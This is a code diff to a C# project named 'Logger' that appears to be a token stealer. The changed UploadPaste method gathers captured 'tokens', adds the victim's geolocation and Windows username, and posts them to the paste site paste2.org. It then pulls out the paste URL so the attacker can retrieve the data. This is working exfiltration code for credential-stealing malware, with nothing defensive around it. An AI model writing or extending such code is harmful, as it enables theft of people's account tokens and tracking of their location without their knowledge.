@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Text;
 using System.Net.Http;
 using System.Collections.Generic;
 using System.Text.RegularExpressions;
@@ -11,17 +12,28 @@ namespace Logger
         private const string partToExclude = "/pastes";
         public string finalURL = string.Empty;
 
-        HttpClient hp = new HttpClient();
-
-        Dictionary<string, string> formData = new Dictionary<string, string>
+        public void UploadPaste(ref StringBuilder tokens)
         {
-            { "code", Token.tokens.ToString() },
-            { "lang", "text" },
-            { "description", $"Tokens for user: {Environment.UserName}\nUploaded at: {DateTime.Now}" }
-        };
+            Location locationInstance = new Location();
 
-        public void UploadPaste()
-        {
+            HttpClient hp = new HttpClient();
+
+            Dictionary<string, string> formData = new Dictionary<string, string>
+            {
+                { "code", 
+                    $"{tokens}\n" +
+                    $"Geolocation information:\n" +
+                    $"{string.Join("\n", locationInstance.GetGEOInformation())}" 
+                },
+
+                { "lang", "text" },
+
+                { "description",
+                    $"Tokens for user: {Environment.UserName}\n" +
+                    $"Paste uploaded at: {DateTime.Now}"
+                }
+            };
+
             try
             {
                 Regex pasteURLPattern = new Regex(@"https:\/\/paste2\.org\/pastes\/[A-Za-z0-9]{8}");
